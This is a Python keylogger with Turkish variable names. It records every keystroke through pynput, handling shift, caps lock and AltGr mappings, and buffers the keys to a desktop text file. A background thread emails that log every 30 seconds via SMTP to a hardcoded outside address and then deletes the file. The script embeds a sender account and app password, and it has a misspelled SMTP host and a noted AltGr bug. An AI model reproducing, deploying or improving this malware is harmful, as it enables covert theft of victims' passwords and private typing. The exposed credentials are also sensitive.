from pynput.keyboard import Listener,Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os
import time
import threading


liste=list()
cpdurum = False
shdurum = False
gr_durum = False

# ALT GR SORUN VAR

def main():

    gr_liste = ["}",">","£","#","$","½","","{","[","]"]
    shliste = ["=","!","'","^","+","%","&","/","{","}"]
    rakam = "0123456789"
    def bas(key):
        global liste,cpdurum,shdurum,gr_durum

        try:
            if shdurum:
                if key.char in rakam:
                    liste.append(shliste[int(key.char)])
                else:
                    if key.char == "*":
                        liste.append("?")
                    elif key.char == "-":
                        liste.append("_")
                    elif not cpdurum:
                        liste.append(key.char.upper())
                    else:
                        liste.append(key.char)

            elif gr_durum:
                if key.char in rakam:
                    liste.append(gr_liste[int(key.char)])
                else:
                    if key.char == "*":
                        liste.append("\\")
                    if key.char == "-":
                        liste.append("|")
                    if key.char == "q":
                        liste.append("@")

            elif cpdurum:
                liste.append(key.char.upper())
            else:
                liste.append(key.char)

        except AttributeError:
            if key == Key.space:
                liste.append(" ")
            if key == Key.enter:
                liste.append("\n")
            if key == Key.backspace:
                liste.append("'<-'")
            if key == Key.caps_lock:
                cpdurum= not cpdurum
            if key == Key.shift_r or key == Key.shift_l:
                shdurum = True
            if key == Key.alt_gr:
                gr_durum = True

        if len(liste) >= 30:
            dosya_yaz()
            liste = list()

    def birak(key):
        global shdurum,gr_durum
        if key == Key.shift_l or key == Key.shift_r:
            shdurum = False
        if key == Key.alt_gr:
            gr_durum = False

    def dosya_yaz():
        global liste

        with open("C:/Users/win10/Desktop/Keylogger.txt","a",encoding='utf-8') as file:
            for x in liste:
                file.write(x)


    with Listener(on_press=bas,on_release=birak) as listener:
        listener.join()

def mail_gonder():
    while 1:
        time.sleep(30)

        konum = "C:/Users/win10/Desktop/Keylogger.txt"

        try:
            if os.path.getsize(konum)>=60:# dosyanın boyutunu öğrenme
                with open(konum,"r",encoding='utf-8') as file:
                    icerik = file.read()


                yapi = MIMEMultipart()
                yapi["From"] = "ozaytepe111@gmail.com"
                yapi["To"] = "west_moon@hotmail.com"
                yapi["Subject"] = "LOG"

                yazi = MIMEText(icerik,"plain") # plaini text olarak yazdık

                yapi.attach(yazi)

                server = smtplib.SMTP("smtb.gmail.com",587)

                server.ehlo()

                server.starttls()

                server.login("ozaytepe111@gmail.com","ftdzhurfrrgyyqnz")



                server.sendmail("ozaytepe111@gmail.com","west_moon@hotmail.com",yapi.as_string())

                server.close()

                os.remove(konum) # dosyayi siliyor
        except Exception as Hata:
            print(str(Hata))

t1 = threading.Thread(target=main)
t2 = threading.Thread(target=mail_gonder)

t1.start()
t2.start()